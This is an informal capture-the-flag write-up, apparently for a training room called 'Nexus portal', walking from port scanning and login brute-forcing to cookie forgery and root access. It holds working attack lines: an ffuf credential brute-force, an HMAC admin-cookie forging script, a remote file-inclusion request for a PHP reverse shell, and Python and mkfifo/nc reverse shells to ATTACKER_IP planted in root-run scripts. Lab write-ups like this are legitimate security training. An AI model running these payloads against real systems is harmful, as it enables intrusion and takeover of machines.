T: TARGET_IP

A: ATTACKER_IP


first: `nmap -sS TARGET_IP`

22 and 80 are open

maybe some higher ports? `nmap -sS -p- TARGET_IP`

nope.

scripts, version: `nmap -sC -sV -p22,80 TARGET_IP`

let's look into 80 - http


login page, that informs us about username format:

```
username: firstname.lastname
password: password
```

since we don't know anything, we will `gobuster` a bit

the target seems to be named nexus portal, so to make things easier, let's add it to our `/etc/hosts` file:

`TARGET_IP nexus`

since we are swagger we leave nothing to chance and use a lot of extensions:

`gobuster dir -u TARGET_IP/ -w /usr/share/wordlists/dirb/common.txt -x .js,.php,.html,.bak`

```go
/.html                (Status: 403) [Size: 279]
/.php                 (Status: 403) [Size: 279]
/.hta.js              (Status: 403) [Size: 279]
/.hta                 (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.hta.php             (Status: 403) [Size: 279]
/.hta.html            (Status: 403) [Size: 279]
/.hta.bak             (Status: 403) [Size: 279]
/.htaccess.bak        (Status: 403) [Size: 279]
/.htaccess.html       (Status: 403) [Size: 279]
/.htaccess.php        (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.htpasswd.bak        (Status: 403) [Size: 279]
/.htpasswd.js         (Status: 403) [Size: 279]
/.htaccess.js         (Status: 403) [Size: 279]
/.htpasswd.html       (Status: 403) [Size: 279]
/.htpasswd.php        (Status: 403) [Size: 279]
/403.php              (Status: 200) [Size: 322]
/admin                (Status: 301) [Size: 316] [--> http://TARGET_IP/admin/]
/api                  (Status: 301) [Size: 314] [--> http://TARGET_IP/api/]
/auth.php             (Status: 200) [Size: 0]
/backup               (Status: 301) [Size: 317] [--> http://TARGET_IP/backup/]
/config.php           (Status: 200) [Size: 0]
/dashboard.php        (Status: 302) [Size: 0] [--> /index.php]
/forgot.php           (Status: 200) [Size: 684]
/index.php            (Status: 200) [Size: 861]
/index.php            (Status: 200) [Size: 861]
/javascript           (Status: 301) [Size: 321] [--> http://TARGET_IP/javascript/]
/logout.php           (Status: 302) [Size: 0] [--> /index.php]
/server-status        (Status: 403) [Size: 279]
/static               (Status: 301) [Size: 317] [--> http://TARGET_IP/static/]
/support              (Status: 301) [Size: 318] [--> http://TARGET_IP/support/]
/team.php             (Status: 200) [Size: 3747]
Progress: 230

```

http 403 is forbidden

http 301 is moved permanently and 302 is moved temporarily, which we will check after

so first we look at 200s:

```
/403.php              (Status: 200) [Size: 322]
/auth.php             (Status: 200) [Size: 0]
/config.php           (Status: 200) [Size: 0]
/forgot.php           (Status: 200) [Size: 684]
/index.php            (Status: 200) [Size: 861]
/team.php             (Status: 200) [Size: 3747]
```

`/auth.php` and `/config.php` are empty, so we can ignore them

`/index.php` is the login page

`/team.php` and `/403.php` remain

`/403.php` just says "403 forbidden" with a link to `index.php` - ignore

`/team.php` has a list of team members' first and last names (email addresses)

we could use `cupp` to generate some wordlists, it's these 3 lines:

```
git clone https://github.com/Mebus/cupp.git
cd cupp
python3 cupp.py -i
```

but let's think first

we looked through `/backup` which led us to `/static/app.js` where we found a hint to decrypting an encrypted config file (config.enc):

```
// Encryption key for backup config decryption - AES-ECB-128
        // Key: N3xusK3y2024!!  (pad to 16 bytes)
```

one gemini consultation later ... we got the command:

the -K is the padded key in hex


`openssl enc -d -aes-128-ecb -in config.enc -out config.dec -K 4e337875734b33793230323421210000 -nopad`

zero useful info gained, just that devops user "exists"

```
{"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}
```

wtf i am lost

### --brute-force with ffuf--

idk lets try #f*ck_hydra_http_post_form_bullshi

devops user seems to be robert.wilson

```
ffuf -w usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://TARGET_IP/index.php -fs 918
```

thank fu*k we got a hit on `robert.wilson / password` that was wildly unexpected

quick IDOR: `http://TARGET_IP/api/users/profile.php?id=1` to see who is admin

laura.hayes and we got first flag

we can also open a ticket (maybe XSS?)

we can access internal files with:

```
File Viewer

Access internal documents via the secure file API.

Endpoint: /api/files.php?name=

Requires JWT authentication via /api/auth/token.php
```

that looks like a burpsuite problem, maybe even ffuf for enum?

burpsuite method did not work, the internal file api does not really work

i got a little hint: php injection

we will inject `?name=http://ATTACKER_IP/rev.php` for a revshell

`nano rev.php` and paste pentest monkey's revshell

`python3 -m http.server 8000`

okay I got another hint: jwt.io

we need to craft a JWT token for admin, else the upload will not work

we seen the structure so the payload is:

```
{
  "sub": "sarah.johnson",
  "role": "admin",
  "iat": 1736292124,
  "exp": 1736292124
}
```

with `{"alg":"none"}`

bruh it dont work

oopsies, I used the wrong accounts together - I was logged in with robert wilson not sarah

but we will try this:
1) log in with sarah.johnson / password
2) get the legit JWT token
3) try to curl the file api config

`curl 'http://TARGET_IP/api/files.php?name=/var/www/html/config.php' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3ODc1NTczNzksImV4cCI6MTc4NzU2MDk3OX0.ZDs1vH1zIRJJF3tsMYU5BcDe/AWlgF66ETD7TyO9agQ'`

this should have given us the following info, but the room is broken (as per usual):

cookie structure: Base64(user_json) + "." + HMAC-SHA256(json, APP_SECRET)

so we basically need to have:

user_json = {"user_id": 1,"username": "laura.hayes", "role": "admin"}

APP_SECRET = nexus_app_k3y_2024

and that's it to forge the admin cookie

I **stole this script**, because this is way too long of a room:

```python
# author: ninjax11
# link: https://ninjax11.gitbook.io/docs/tryhackme/domino
import base64, hmac, hashlib, json

SECRET_KEY = b"nexus_app_k3y_2024"
user_payload = {"user_id": 1, "username": "laura.hayes", "role": "admin"}

json_str = json.dumps(user_payload, separators=(',', ':'))
base64_payload = base64.b64encode(json_str.encode()).decode()
signature = hmac.new(SECRET_KEY, base64_payload.encode(), hashlib.sha256).hexdigest()

forged_cookie = f"{base64_payload}.{signature}"
print(forged_cookie)
```

cookie: `eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImxhdXJhLmhheWVzIiwicm9sZSI6ImFkbWluIn0=.179723f1fbd3331a8f6cc790ebd2adfbff9fda87f2d4e4190ee0169eaf811025`


next steps:
4) curl for our revshell (http://ATTACKER_IP/rev.php)
5) ???
6) root

`python3 -m http.server 8000`

`nc -lvnp 4444`

took the first php revshell from pentestmonkey and curled for it:

curl 'http://TARGET_IP/api/files.php?name=http://ATTACKER_IP:8000/rev.php' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzg3NTYxNzE0LCJleHAiOjE3ODc1NjUzMTR9.l4Zk8TRPDsjQPT7tOIZSF0KNuYhS+qZnQ//u5ZcBiec'

base64 decoding the token, we see that the internal token generator generates a user token even for an admin so we are completely stuck

another 2 hours down the drain, in total 6-8 hours for nothing. I am pretty sad

there is actually password reuse as a shortcut to getting a shell

the password was found in the file api config

`ssh devops@TARGET_IP`
D3v0ps!2024

`sudo -l` gives nothing

so `pspy` for processes

download `pspy64` from github:

attacker:

1) `python3 -m http.server 8000`

devops (target):

1) `wget http://ATTACKER_IP:8000/pspy64`
2) `chmod +x pspy64`
3) `./pspy64`

we immediately found this:

```
there is /opt/admin_bot.py which we can rwx and runs as root

and then there is /opt/monitoring/health_report.sh running as root every few seconds and we also have rwx on it
```

python revshell from pentestmonkey:

we will use port 6767 (because six seven)

just put this at the start of the script: `import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",6767));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")`

does not connect hmm

let's try the bash:
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 6969 >/tmp/f`

it connected instantly as root!
